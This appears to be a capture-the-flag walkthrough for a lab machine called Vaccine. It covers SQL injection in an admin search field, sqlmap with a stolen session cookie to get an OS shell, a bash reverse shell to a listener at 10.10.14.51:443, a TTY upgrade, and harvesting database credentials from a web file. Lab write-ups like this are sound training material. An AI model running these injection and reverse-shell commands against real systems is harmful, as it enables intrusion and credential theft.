With admin:qwerty789 credentials we can enter to the admin panel. In the search field we try some sql injection:

With the value `admin'/**/and/**/1=1))--` we get the following error:

```text
ERROR: syntax error at or near ")" LINE 1: ...ct * from cars where name ilike '%admin'/**/and/**/1=1))--%' ^
```

So we can say that it is vulnerable, lets try with sqlmap using the PHPSESSID cookie retrieved in our browser

```bash
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ sqlmap -u "http://10.129.107.183/dashboard.php?search=test" --cookie="PHPSESSID=ijis7dk7c10vprh4smer11lmqp" --os-shell

 [SNIP]
 
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] y
[01:30:21] [INFO] retrieved: 'postgres'
```

And we got a shell. This shell works really bad so lets open a netcat listener on port 443 and get a reverse shell

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443                                    
listening on [any] 443 ...
connect to [10.10.14.51] from (UNKNOWN) [10.129.214.36] 51622
bash: cannot set terminal process group (1843): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$

<------------------>

[08:50:19] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.51/443 0>&1"
```

Now lets upgrade shell TTY. Cancel it and open again with bash, not with zsh (cause fg command fails) and execute the following commands

```text
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
Now use fg command, then press enter twice
```

We are in /var/lib/postgresql/11/main folder, go back to /var/lib/postgresql and there we can find the user flag. In folder /var/www/html we can find the dashboard.php file where we can find the postgres:P@s5w0rd! credentials

The terminal is continuosly dying but we have a valid credentials, so we can continue by SSH
